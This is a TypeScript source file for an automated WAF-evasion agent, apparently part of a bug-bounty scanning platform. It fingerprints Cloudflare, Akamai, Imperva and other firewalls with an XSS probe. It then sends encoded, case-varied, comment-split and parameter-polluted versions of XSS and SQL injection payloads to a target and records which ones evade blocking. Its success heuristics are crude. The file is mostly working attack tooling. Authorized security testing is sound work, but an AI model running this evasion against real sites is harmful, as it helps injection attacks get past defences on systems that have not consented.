/**
 * WAF Bypass Engine Agent
 * Purpose: Intelligent WAF evasion and bypass testing
 * 
 * Techniques:
 * - Encoding (URL, Unicode, HTML entities)
 * - Case variation
 * - Comment injection
 * - HTTP parameter pollution
 * - Content-Type confusion
 * - Chunked encoding
 * - IP rotation awareness
 */

import { Job } from 'bullmq';
import { BaseAgent } from './base';
import { BaseJob } from '../../../shared/types';
import database from '../services/database';
import logger from '../utils/logger';
import { v4 as uuidv4 } from 'uuid';

interface WAFBypassJob extends BaseJob {
  type: 'waf-bypass';
  options: {
    targetUrl: string;
    programId: string;
    payload: string;
    payloadType: 'xss' | 'sqli' | 'rce' | 'lfi' | 'generic';
    testAllTechniques?: boolean;
  };
}

interface WAFBypassFinding {
  technique: string;
  originalPayload: string;
  bypassPayload: string;
  wafDetected?: string;
  severity: 'high' | 'medium' | 'low';
  endpoint: string;
  description: string;
}

// WAF fingerprints
const WAF_SIGNATURES: Record<string, string[]> = {
  'Cloudflare': ['cf-ray', '__cfduid', 'cloudflare'],
  'AWS WAF': ['x-amzn-requestid', 'awselb'],
  'Akamai': ['akamai', 'x-akamai'],
  'Imperva': ['incap_ses', 'visid_incap', 'x-iinfo'],
  'F5 BIG-IP': ['bigipserver', 'x-wa-info'],
  'ModSecurity': ['mod_security', 'modsecurity'],
  'Sucuri': ['x-sucuri-id', 'sucuri'],
  'Barracuda': ['barra_counter_session'],
  'Fortinet': ['fortigate', 'fortiwafsid'],
};

export class WAFBypassAgent extends BaseAgent<WAFBypassJob> {
  constructor() {
    super('waf-bypass');
  }

  protected getSteps() {
    return [
      { name: 'Detect WAF type' },
      { name: 'Test encoding bypasses' },
      { name: 'Test case variations' },
      { name: 'Test comment injection' },
      { name: 'Test HTTP smuggling' },
      { name: 'Store successful bypasses' },
    ];
  }

  async process(job: Job<WAFBypassJob>): Promise<any> {
    const { programId, options } = job.data;
    const { targetUrl, payload, payloadType, testAllTechniques = true } = options;

    await this.heartbeat();
    await this.updateJobStatus(job.id!, 'active');

    const findings: WAFBypassFinding[] = [];

    try {
      // Step 1: Detect WAF type
      await this.updateJobProgress(job.id!, {
        current: 1,
        total: 6,
        percentage: 10,
        currentTool: 'waf-detector',
        toolStatus: 'running',
        message: 'Detecting WAF type',
      });

      const wafType = await this.detectWAF(targetUrl);
      logger.info({ wafType }, 'WAF detection complete');

      // Step 2: Test encoding bypasses
      await this.updateJobProgress(job.id!, {
        current: 2,
        total: 6,
        percentage: 25,
        currentTool: 'encoding-bypass',
        toolStatus: 'running',
        message: 'Testing encoding bypasses',
      });

      const encodingBypasses = await this.testEncodingBypasses(targetUrl, payload, payloadType, wafType);
      findings.push(...encodingBypasses);

      // Step 3: Test case variations
      await this.updateJobProgress(job.id!, {
        current: 3,
        total: 6,
        percentage: 40,
        currentTool: 'case-variation',
        toolStatus: 'running',
        message: 'Testing case variations',
      });

      const caseBypasses = await this.testCaseVariations(targetUrl, payload, payloadType, wafType);
      findings.push(...caseBypasses);

      // Step 4: Test comment injection
      await this.updateJobProgress(job.id!, {
        current: 4,
        total: 6,
        percentage: 60,
        currentTool: 'comment-injection',
        toolStatus: 'running',
        message: 'Testing comment injection',
      });

      const commentBypasses = await this.testCommentInjection(targetUrl, payload, payloadType, wafType);
      findings.push(...commentBypasses);

      // Step 5: Test HTTP smuggling techniques
      await this.updateJobProgress(job.id!, {
        current: 5,
        total: 6,
        percentage: 80,
        currentTool: 'http-smuggling',
        toolStatus: 'running',
        message: 'Testing HTTP parameter pollution',
      });

      const hppBypasses = await this.testHTTPParameterPollution(targetUrl, payload, payloadType, wafType);
      findings.push(...hppBypasses);

      // Step 6: Store findings
      await this.updateJobProgress(job.id!, {
        current: 6,
        total: 6,
        percentage: 95,
        currentTool: 'storage',
        toolStatus: 'running',
        message: 'Storing successful bypasses',
      });

      for (const finding of findings) {
        await this.storeFinding(programId, finding, job.id!);
      }

      await this.updateJobProgress(job.id!, {
        current: 6,
        total: 6,
        percentage: 100,
        currentTool: 'complete',
        toolStatus: 'completed',
        message: `Found ${findings.length} WAF bypasses`,
      });

      const result = {
        targetUrl,
        wafDetected: wafType,
        originalPayload: payload,
        bypassesFound: findings.length,
        findings,
      };

      await this.updateJobStatus(job.id!, 'completed', result);
      return result;

    } catch (error: any) {
      logger.error({ error, targetUrl }, 'WAF bypass testing failed');
      await this.updateJobStatus(job.id!, 'failed', null, error.message);
      throw error;
    }
  }

  /**
   * Detect WAF type
   */
  private async detectWAF(url: string): Promise<string | undefined> {
    try {
      // Send a request with a known malicious payload to trigger WAF
      const testPayload = '<script>alert(1)</script>';
      const response = await this.makeRequest(`${url}?test=${encodeURIComponent(testPayload)}`, 'GET');

      // Check response headers and body for WAF signatures
      const allHeaders = JSON.stringify(response.headers).toLowerCase();
      const body = response.body.toLowerCase();

      for (const [wafName, signatures] of Object.entries(WAF_SIGNATURES)) {
        for (const sig of signatures) {
          if (allHeaders.includes(sig.toLowerCase()) || body.includes(sig.toLowerCase())) {
            return wafName;
          }
        }
      }

      // Check for generic WAF indicators
      if (response.status === 403 || response.status === 406 || response.status === 429) {
        if (body.includes('blocked') || body.includes('forbidden') || body.includes('security')) {
          return 'Unknown WAF';
        }
      }

      return undefined;
    } catch (error) {
      return undefined;
    }
  }

  /**
   * Test encoding bypasses
   */
  private async testEncodingBypasses(
    url: string,
    payload: string,
    payloadType: string,
    wafType?: string
  ): Promise<WAFBypassFinding[]> {
    const findings: WAFBypassFinding[] = [];

    const encodingTechniques = [
      // URL encoding
      { name: 'URL Encoding', transform: (p: string) => encodeURIComponent(p) },
      { name: 'Double URL Encoding', transform: (p: string) => encodeURIComponent(encodeURIComponent(p)) },
      
      // Unicode encoding
      { name: 'Unicode Encoding', transform: (p: string) => this.toUnicode(p) },
      
      // HTML entity encoding
      { name: 'HTML Entity Encoding', transform: (p: string) => this.toHtmlEntities(p) },
      { name: 'Hex HTML Encoding', transform: (p: string) => this.toHexHtmlEntities(p) },
      
      // Mixed encoding
      { name: 'Mixed Case URL', transform: (p: string) => this.mixedCaseUrl(p) },
      
      // Null byte injection
      { name: 'Null Byte Injection', transform: (p: string) => `%00${p}` },
      
      // Tab/newline injection
      { name: 'Tab Injection', transform: (p: string) => p.replace(/ /g, '\t') },
      { name: 'Newline Injection', transform: (p: string) => p.replace(/ /g, '\n') },
    ];

    for (const technique of encodingTechniques) {
      try {
        const bypassPayload = technique.transform(payload);
        const testUrl = `${url}?input=${bypassPayload}`;
        const response = await this.makeRequest(testUrl, 'GET');

        // Check if bypass was successful (not blocked)
        if (response.status === 200 && !this.isBlocked(response)) {
          // Verify payload execution/reflection
          if (response.body.includes(payload) || this.payloadExecuted(response.body, payloadType)) {
            findings.push({
              technique: technique.name,
              originalPayload: payload,
              bypassPayload,
              wafDetected: wafType,
              severity: 'high',
              endpoint: url,
              description: `WAF bypass successful using ${technique.name}`,
            });
          }
        }
      } catch (error) {
        logger.debug({ error, technique: technique.name }, 'Encoding bypass test error');
      }
    }

    return findings;
  }

  /**
   * Test case variations
   */
  private async testCaseVariations(
    url: string,
    payload: string,
    payloadType: string,
    wafType?: string
  ): Promise<WAFBypassFinding[]> {
    const findings: WAFBypassFinding[] = [];

    const caseVariations = [
      { name: 'Upper Case', transform: (p: string) => p.toUpperCase() },
      { name: 'Lower Case', transform: (p: string) => p.toLowerCase() },
      { name: 'Mixed Case', transform: (p: string) => this.randomCase(p) },
      { name: 'Alternating Case', transform: (p: string) => this.alternatingCase(p) },
    ];

    for (const variation of caseVariations) {
      try {
        const bypassPayload = variation.transform(payload);
        const testUrl = `${url}?input=${encodeURIComponent(bypassPayload)}`;
        const response = await this.makeRequest(testUrl, 'GET');

        if (response.status === 200 && !this.isBlocked(response)) {
          if (this.payloadExecuted(response.body, payloadType)) {
            findings.push({
              technique: variation.name,
              originalPayload: payload,
              bypassPayload,
              wafDetected: wafType,
              severity: 'medium',
              endpoint: url,
              description: `WAF bypass successful using ${variation.name}`,
            });
          }
        }
      } catch (error) {
        logger.debug({ error, variation: variation.name }, 'Case variation test error');
      }
    }

    return findings;
  }

  /**
   * Test comment injection
   */
  private async testCommentInjection(
    url: string,
    payload: string,
    payloadType: string,
    wafType?: string
  ): Promise<WAFBypassFinding[]> {
    const findings: WAFBypassFinding[] = [];

    // Comment patterns based on payload type
    const commentPatterns: Record<string, Array<{ name: string; transform: (p: string) => string }>> = {
      'sqli': [
        { name: 'SQL Inline Comment', transform: (p: string) => p.replace(/ /g, '/**/') },
        { name: 'SQL Hash Comment', transform: (p: string) => `${p}#` },
        { name: 'SQL Double Dash', transform: (p: string) => `${p}--` },
        { name: 'MySQL Version Comment', transform: (p: string) => p.replace(/SELECT/gi, '/*!SELECT*/') },
      ],
      'xss': [
        { name: 'HTML Comment Break', transform: (p: string) => p.replace(/<script>/gi, '<scr<!---->ipt>') },
        { name: 'JS Comment', transform: (p: string) => p.replace(/alert/gi, 'al/**/ert') },
        { name: 'SVG Comment', transform: (p: string) => `<svg/onload=${p.replace(/<script>|<\/script>/gi, '')}>` },
      ],
      'generic': [
        { name: 'Whitespace Variation', transform: (p: string) => p.replace(/ /g, '  ') },
        { name: 'Tab Substitution', transform: (p: string) => p.replace(/ /g, '\t') },
      ],
    };

    const patterns = commentPatterns[payloadType] || commentPatterns['generic'];

    for (const pattern of patterns) {
      try {
        const bypassPayload = pattern.transform(payload);
        const testUrl = `${url}?input=${encodeURIComponent(bypassPayload)}`;
        const response = await this.makeRequest(testUrl, 'GET');

        if (response.status === 200 && !this.isBlocked(response)) {
          if (this.payloadExecuted(response.body, payloadType)) {
            findings.push({
              technique: pattern.name,
              originalPayload: payload,
              bypassPayload,
              wafDetected: wafType,
              severity: 'high',
              endpoint: url,
              description: `WAF bypass successful using ${pattern.name}`,
            });
          }
        }
      } catch (error) {
        logger.debug({ error, pattern: pattern.name }, 'Comment injection test error');
      }
    }

    return findings;
  }

  /**
   * Test HTTP Parameter Pollution
   */
  private async testHTTPParameterPollution(
    url: string,
    payload: string,
    payloadType: string,
    wafType?: string
  ): Promise<WAFBypassFinding[]> {
    const findings: WAFBypassFinding[] = [];

    const hppPatterns = [
      // Duplicate parameters
      { name: 'Duplicate Parameter', transform: (p: string) => `input=safe&input=${encodeURIComponent(p)}` },
      { name: 'Array Parameter', transform: (p: string) => `input[]=safe&input[]=${encodeURIComponent(p)}` },
      
      // Content-Type confusion
      { name: 'JSON in Form', transform: (p: string) => `{"input":"${p}"}` },
    ];

    for (const pattern of hppPatterns) {
      try {
        let testUrl: string;
        let method = 'GET';
        let body: string | undefined;

        if (pattern.name === 'JSON in Form') {
          testUrl = url;
          method = 'POST';
          body = pattern.transform(payload);
        } else {
          testUrl = `${url}?${pattern.transform(payload)}`;
        }

        const response = await this.makeRequest(testUrl, method, body);

        if (response.status === 200 && !this.isBlocked(response)) {
          if (this.payloadExecuted(response.body, payloadType)) {
            findings.push({
              technique: pattern.name,
              originalPayload: payload,
              bypassPayload: pattern.transform(payload),
              wafDetected: wafType,
              severity: 'medium',
              endpoint: url,
              description: `WAF bypass successful using ${pattern.name}`,
            });
          }
        }
      } catch (error) {
        logger.debug({ error, pattern: pattern.name }, 'HPP test error');
      }
    }

    return findings;
  }

  // Helper methods
  private toUnicode(str: string): string {
    return str.split('').map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`).join('');
  }

  private toHtmlEntities(str: string): string {
    return str.split('').map(c => `&#${c.charCodeAt(0)};`).join('');
  }

  private toHexHtmlEntities(str: string): string {
    return str.split('').map(c => `&#x${c.charCodeAt(0).toString(16)};`).join('');
  }

  private mixedCaseUrl(str: string): string {
    return str.split('').map((c, i) => i % 2 === 0 ? `%${c.charCodeAt(0).toString(16)}` : c).join('');
  }

  private randomCase(str: string): string {
    return str.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
  }

  private alternatingCase(str: string): string {
    return str.split('').map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join('');
  }

  private isBlocked(response: { status: number; body: string }): boolean {
    const blockedIndicators = ['blocked', 'forbidden', 'denied', 'not allowed', 'security', 'waf'];
    const bodyLower = response.body.toLowerCase();
    return response.status === 403 || response.status === 406 || 
           blockedIndicators.some(ind => bodyLower.includes(ind));
  }

  private payloadExecuted(body: string, payloadType: string): boolean {
    // Check for signs of payload execution based on type
    switch (payloadType) {
      case 'xss':
        return body.includes('<script') || body.includes('onerror') || body.includes('onload');
      case 'sqli':
        return body.includes('error') || body.includes('syntax') || body.includes('mysql');
      default:
        return true; // For generic, assume success if not blocked
    }
  }

  private async makeRequest(url: string, method: string, body?: string): Promise<{ status: number; body: string; headers: Record<string, string> }> {
    try {
      const response = await fetch(url, {
        method,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Content-Type': body ? 'application/x-www-form-urlencoded' : 'text/html',
        },
        body,
      });

      const headers: Record<string, string> = {};
      response.headers.forEach((v, k) => headers[k] = v);

      return { status: response.status, body: await response.text(), headers };
    } catch (error) {
      return { status: 0, body: '', headers: {} };
    }
  }

  private async storeFinding(programId: string, finding: WAFBypassFinding, jobId: string): Promise<void> {
    try {
      await database.query(
        `INSERT INTO findings (id, program_id, job_id, type, severity, title, url, description, evidence, status, created_at)
         VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, 'new', CURRENT_TIMESTAMP)
         ON CONFLICT (id) DO NOTHING`,
        [
          uuidv4(),
          programId,
          jobId,
          'waf-bypass',
          finding.severity,
          `WAF Bypass: ${finding.technique}`,
          finding.endpoint,
          finding.description,
          JSON.stringify({ technique: finding.technique, originalPayload: finding.originalPayload, bypassPayload: finding.bypassPayload, wafDetected: finding.wafDetected }),
        ]
      );
    } catch (error) {
      logger.error({ error, finding }, 'Failed to save WAF bypass finding');
    }
  }
}

export default new WAFBypassAgent();
